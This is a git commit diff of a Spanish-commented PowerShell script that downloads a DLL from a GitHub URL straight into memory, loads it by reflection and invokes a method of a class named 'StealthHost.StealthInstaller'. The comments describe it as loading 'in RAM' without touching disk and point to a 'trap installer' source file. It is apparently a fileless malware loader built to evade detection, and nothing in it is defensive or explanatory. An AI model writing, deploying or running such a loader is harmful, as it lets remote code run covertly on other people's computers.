4de088ac9aad39d713e1f95e4eca21eeeb6ee2ff
dps <7b1eahh@gmail.com>
2026-03-15 17:53:55 -0300

    Update Nuevo documento de texto.ps1

--- Nuevo documento de texto.ps1
+++ Nuevo documento de texto.ps1
@@ -1,7 +1,8 @@
-# Este script baja la DLL a RAM y la inyecta sin tocar disco
-$url = "https://raw.githubusercontent.com/TuUsuario/TuRepo/main/sys.dll"
+# ghost.ps1 - Carga en RAM absoluta
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+$url = "https://github.com/7b1eahh-lang/Hero/raw/refs/heads/main/sys.dll" # <--- Tu DLL compilada
 $bytes = (New-Object System.Net.WebClient).DownloadData($url)
 $assembly = [System.Reflection.Assembly]::Load($bytes)
 $class = $assembly.GetType("StealthHost.StealthInstaller")
-$method = $class.GetMethod("RunGhost")
-$method.Invoke($null, $null)
+$method = $class.GetMethod("Uninstall") # <--- Tu método en InstaladorTrampa.cs
+$method.Invoke($null, @($null))
